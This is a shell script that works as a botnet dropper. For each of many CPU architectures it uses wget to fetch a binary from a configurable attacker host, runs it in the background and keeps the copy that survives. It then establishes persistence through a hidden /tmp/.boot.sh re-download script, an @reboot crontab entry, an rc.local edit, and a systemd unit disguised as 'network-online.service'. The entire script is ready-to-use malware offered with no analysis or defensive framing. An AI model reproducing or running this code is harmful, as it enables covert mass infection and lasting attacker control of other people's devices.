#!/bin/sh
URL="your-ip:5513"
# just monika
set -- x86_64-linux-gnu aarch64-linux-gnu i686-linux-gnu armv7l-linux-gnu armv6l-linux-gnu armv5l-linux-gnu armv4l-linux-gnu alpha-linux-gnu hppa-linux-gnu i586-linux-gnu m68k-linux-gnu mips-linux-gnu mips64-linux-gnu mips64el-linux-gnu mipsel-linux-gnu powerpc-linux-gnu powerpc64-linux-gnu powerpc64le-linux-gnu riscv64-linux-gnu s390x-linux-gnu sh4-linux-gnu sparc64-linux-gnu x86-linux-gnu
for b; do
    cd /tmp || continue
    wget -q "http://$URL/bin/$b" -O "$b" || continue
    chmod +x "$b"
    killall "$b" 2>/dev/null
    nohup "./$b" >/dev/null 2>&1 &
    PID=$!
    sleep 3
    if kill -0 "$PID" 2>/dev/null; then
        BOOT="/tmp/.boot.sh"
        cat > "$BOOT" <<- BOOTEOF
	#!/bin/sh
	[ -x /tmp/$b ] || { wget -q http://$URL/bin/$b -O /tmp/$b && chmod +x /tmp/$b; }; pidof "$b" >/dev/null 2>&1 || nohup /tmp/$b >/dev/null 2>&1 &
	BOOTEOF
        chmod +x "$BOOT"
        if command -v crontab >/dev/null 2>&1; then
            (crontab -l 2>/dev/null | grep -v '\.boot\.sh'; echo "@reboot sh $BOOT") | crontab - 2>/dev/null
        fi
        if [ -f /etc/rc.local ]; then
            sed -i '/exit 0/d' /etc/rc.local 2>/dev/null
            grep -q 'boot\.sh' /etc/rc.local 2>/dev/null || echo "sh $BOOT" >> /etc/rc.local
            echo "exit 0" >> /etc/rc.local
            chmod +x /etc/rc.local 2>/dev/null
        fi
        if command -v systemctl >/dev/null 2>&1; then
            cat > /tmp/.bot.service <<- SYSEOF
	[Unit]
	Description=Network Online
	After=network.target

	[Service]
	ExecStart=/bin/sh $BOOT
	Restart=always
	RestartSec=30

	[Install]
	WantedBy=multi-user.target
	SYSEOF
            mkdir -p /etc/systemd/system 2>/dev/null
            cp /tmp/.bot.service /etc/systemd/system/network-online.service 2>/dev/null
            systemctl enable network-online.service 2>/dev/null
            systemctl daemon-reload 2>/dev/null
        fi
        exit 0
    else
        wait "$PID" 2>/dev/null
        rm -f "$b"
        continue
    fi
done
exit 1
